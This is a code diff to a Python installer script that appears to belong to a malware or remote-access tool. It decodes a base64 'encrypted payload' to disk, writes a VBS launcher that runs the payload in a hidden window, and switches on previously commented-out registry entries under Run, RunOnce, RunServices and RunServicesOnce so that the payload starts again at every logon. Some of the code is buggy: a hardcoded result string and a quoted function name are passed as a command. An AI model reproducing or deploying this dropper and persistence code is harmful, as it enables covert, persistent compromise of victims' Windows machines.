@@ -28,17 +28,22 @@ log.debug("Payload filename: " + PAYLOAD_FILENAME)
 
 def get_program_file():
     """:return: The path to the encrypted payload."""
-    return os.path.join(PROGRAM_DIRECTORY, PAYLOAD_FILENAME)
+    path = os.path.expandvars(PROGRAM_DIRECTORY)
+    cpath = path + "\\%s.py" %PAYLOAD_FILENAME
+    return cpath
 
 
 def get_launch_agent_directory():
     """:return: The directory where the launch agent lives."""
-    return os.path.expanduser(PROGRAM_DIRECTORY)
+    return os.path.expandvars(PROGRAM_DIRECTORY)
 
 
 def get_launch_agent_file():
     """:return: The path to the launch agent."""
-    return get_launch_agent_directory() + "\\%s.vbs" % LAUNCH_AGENT_NAME
+    path = os.path.expandvars(get_launch_agent_directory())
+    log.debug(path)
+    cpath = path + "\\%s.vbs" % LAUNCH_AGENT_NAME
+    return cpath
 
 
 def run_command(command):
@@ -48,25 +53,28 @@ def run_command(command):
 
 # Create directories
 run_command("mkdir " + PROGRAM_DIRECTORY)
-#run_command("mkdir " + get_launch_agent_directory())
 launch_agent_create = f"""CreateObject("Wscript.Shell").Run "{get_program_file()}",0,True"""
 
 with open(get_launch_agent_file(), "w") as output_file:
     output_file.write(launch_agent_create)
+    output_file.close()
 
 with open(get_program_file(), "w") as output_file:
     output_file.write(base64.b64decode(PAYLOAD_BASE64).decode())
 
-# registries = [f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v {LAUNCH_AGENT_NAME} /t REG_SZ /d "{get_launch_agent_file()}"',
-#                        f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v {LAUNCH_AGENT_NAME} /t REG_SZ /d "{get_launch_agent_file()}"',
-#                        f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v {LAUNCH_AGENT_NAME} /t REG_SZ /d "{get_launch_agent_file()}"',
-#                        f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v {LAUNCH_AGENT_NAME} /t REG_SZ /d "{get_launch_agent_file()}"']
+registries = [f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {LAUNCH_AGENT_NAME} /t REG_SZ /d "{get_launch_agent_file()}"',
+                       f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v {LAUNCH_AGENT_NAME} /t REG_SZ /d "{get_launch_agent_file()}"',
+                       f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices" /v {LAUNCH_AGENT_NAME} /t REG_SZ /d "{get_launch_agent_file()}"',
+                       f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce" /v {LAUNCH_AGENT_NAME} /t REG_SZ /d "{get_launch_agent_file()}"']
 
-# #will create more after some time in windows
+#will create more after some time in windows
+for regs in registries:
+        out = run_command(regs)
 
 out = "The operation completed succesfully"
 if out == "The operation completed succesfully":
     log.info("Done!")
+    run_command("get_program_file()")
     exit(0)
 else:
     log.error("Failed to load launch agent.")
